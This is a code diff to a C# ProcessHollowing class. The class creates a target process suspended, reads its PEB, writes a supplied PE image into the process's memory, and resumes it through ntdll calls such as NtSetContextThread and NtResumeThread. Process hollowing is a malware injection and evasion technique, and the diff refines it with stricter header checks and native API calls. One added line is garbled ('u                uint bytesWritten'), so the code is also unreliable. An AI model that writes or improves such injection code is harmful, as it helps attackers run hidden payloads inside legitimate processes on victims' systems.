@@ -109,8 +109,14 @@ public class ProcessHollowing {
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
 
+    [DllImport("ntdll.dll")]
+    public static extern int NtSetContextThread(IntPtr hThread, ref CONTEXT lpContext);
+
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern uint ResumeThread(IntPtr hThread);
+
+    [DllImport("ntdll.dll")]
+    public static extern int NtResumeThread(IntPtr hThread, out uint SuspendCount);
 
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr VirtualAllocEx(
@@ -135,8 +141,8 @@ public class ProcessHollowing {
         IntPtr ProcessHandle,
         IntPtr BaseAddress,
         byte[] Buffer,
-        int BufferSize,
-        out int NumberOfBytesWritten
+        uint BufferSize,
+        out uint NumberOfBytesWritten
     );
 
     [DllImport("ntdll.dll")]
@@ -144,8 +150,8 @@ public class ProcessHollowing {
         IntPtr ProcessHandle,
         IntPtr BaseAddress,
         IntPtr Buffer,
-        int BufferSize,
-        out int NumberOfBytesRead
+        uint BufferSize,
+        out uint NumberOfBytesRead
     );
 
     [DllImport("kernel32.dll", SetLastError = true)]
@@ -161,21 +167,36 @@ public class ProcessHollowing {
     const uint CONTEXT_FULL = 0x10007;
 
     public static bool HollowProcess(byte[] peBytes, string targetProcess) {
+        IntPtr hProcess = IntPtr.Zero;
+        IntPtr hThread = IntPtr.Zero;
+        
         try {
             // Parse PE headers
-            if (peBytes.Length < 64) return false;
+            if (peBytes.Length < 64) {
+                return false;
+            }
             
             int e_lfanew = BitConverter.ToInt32(peBytes, 60);
-            if (e_lfanew >= peBytes.Length) return false;
+            if (e_lfanew >= peBytes.Length || e_lfanew < 0) {
+                return false;
+            }
             
             // Check DOS signature
-            if (BitConverter.ToUInt16(peBytes, 0) != 0x5A4D) return false; // MZ
+            if (BitConverter.ToUInt16(peBytes, 0) != 0x5A4D) {
+                return false; // MZ
+            }
             
             // Check PE signature
-            if (BitConverter.ToUInt32(peBytes, e_lfanew) != 0x00004550) return false; // PE\0\0
+            if (BitConverter.ToUInt32(peBytes, e_lfanew) != 0x00004550) {
+                return false; // PE\0\0
+            }
             
             // Get ImageBase and SizeOfImage (check if PE32 or PE32+)
             int optionalHeaderOffset = e_lfanew + 24;
+            if (optionalHeaderOffset + 2 >= peBytes.Length) {
+                return false;
+            }
+            
             ushort magic = BitConverter.ToUInt16(peBytes, optionalHeaderOffset);
             
             ulong imageBase;
@@ -183,10 +204,12 @@ public class ProcessHollowing {
             uint entryPoint;
             
             if (magic == 0x20B) { // PE32+ (64-bit)
+                if (optionalHeaderOffset + 64 >= peBytes.Length) return false;
                 imageBase = BitConverter.ToUInt64(peBytes, optionalHeaderOffset + 24);
                 sizeOfImage = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 56);
                 entryPoint = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 16);
             } else if (magic == 0x10B) { // PE32 (32-bit)
+                if (optionalHeaderOffset + 64 >= peBytes.Length) return false;
                 imageBase = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 28);
                 sizeOfImage = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 56);
                 entryPoint = BitConverter.ToUInt32(peBytes, optionalHeaderOffset + 16);
@@ -201,8 +224,12 @@ public class ProcessHollowing {
             
             if (!CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero, false, 
                 CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi)) {
+                int error = Marshal.GetLastWin32Error();
                 return false;
             }
+            
+            hProcess = pi.hProcess;
+            hThread = pi.hThread;
             
             try {
                 // Get thread context
@@ -214,9 +241,10 @@ public class ProcessHollowing {
                 }
                 
                 // Read PEB to get base address (x64: Rdx + 16, which is sizeof(SIZE_T) * 2)
-                IntPtr pebBaseAddress = new IntPtr((long)(ctx.Rdx + 16));
+                // Match the C++ code: NtReadVirtualMemory(processInfo->hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &base, sizeof(PVOID), NULL);
+                IntPtr pebBaseAddress = new IntPtr((long)(ctx.Rdx + 16)); // sizeof(SIZE_T) * 2 = 8 * 2 = 16
                 IntPtr baseAddressPtr = Marshal.AllocHGlobal(8);
-                int bytesRead = 0;
+                uint bytesRead = 0;
                 
                 int status = NtReadVirtualMemory(pi.hProcess, pebBaseAddress, baseAddressPtr, 8, out bytesRead);
                 if (status != 0 || bytesRead != 8) {
@@ -257,8 +285,8 @@ public class ProcessHollowing {
                 byte[] headerBytes = new byte[sizeOfHeaders];
                 Array.Copy(peBytes, 0, headerBytes, 0, sizeOfHeaders);
                 
-                int bytesWritten = 0;
-                status = NtWriteVirtualMemory(pi.hProcess, mem, headerBytes, sizeOfHeaders, out bytesWritten);
+                u                uint bytesWritten = 0;
+                status = NtWriteVirtualMemory(pi.hProcess, mem, headerBytes, (uint)sizeOfHeaders, out bytesWritten);
                 if (status != 0) {
                     TerminateProcess(pi.hProcess, 1);
                     return false;
@@ -284,7 +312,7 @@ public class ProcessHollowing {
                         
                         IntPtr sectionAddr = new IntPtr(mem.ToInt64() + virtualAddress);
                         status = NtWriteVirtualMemory(pi.hProcess, sectionAddr, sectionData, 
-                            (int)sizeOfRawData, out bytesWritten);
+                            sizeOfRawData, out bytesWritten);
                         if (status != 0) {
                             // Continue anyway, some sections might fail
                         }
@@ -303,14 +331,20 @@ public class ProcessHollowing {
                     return false;
                 }
                 
-                // Set thread context
-                if (!SetThreadContext(pi.hThread, ref ctx)) {
+                // Set thread context using NtSetContextThread (like C++ code)
+                status = NtSetContextThread(pi.hThread, ref ctx);
+                if (status != 0) {
                     TerminateProcess(pi.hProcess, 1);
                     return false;
                 }
                 
-                // Resume thread
-                ResumeThread(pi.hThread);
+                // Resume thread using NtResumeThread (like C++ code)
+                uint suspendCount = 0;
+                status = NtResumeThread(pi.hThread, out suspendCount);
+                if (status != 0) {
+                    TerminateProcess(pi.hProcess, 1);
+                    return false;
+                }
                 
                 CloseHandle(pi.hThread);
                 CloseHandle(pi.hProcess);
